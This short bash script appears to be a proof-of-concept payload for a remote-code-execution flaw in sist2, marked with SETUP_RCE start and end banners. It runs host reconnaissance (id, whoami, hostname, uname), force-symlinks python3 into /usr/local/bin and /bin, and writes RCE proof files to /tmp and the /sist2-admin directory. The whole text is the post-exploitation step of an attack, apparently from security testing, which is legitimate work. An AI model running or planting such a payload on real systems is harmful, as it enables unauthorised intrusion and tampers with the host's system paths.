#!/bin/bash
echo "===SETUP_RCE_START==="
id
whoami
hostname
uname -a
ln -sf /usr/bin/python3 /usr/local/bin/python 2>&1 || true
ln -sf /usr/bin/python3 /bin/python 2>&1 || true
which python; which python3
python -c 'print("PYTHON_OK")' 2>&1 || true
echo "RCE_OK $(id) $(date -Iseconds)" > /tmp/sist2_rce_proof.txt
echo "RCE_OK $(id)" > /sist2-admin/rce_proof.txt 2>/dev/null || true
ls -la /usr/local/bin/python /bin/python 2>&1 || true
echo "===SETUP_RCE_END==="
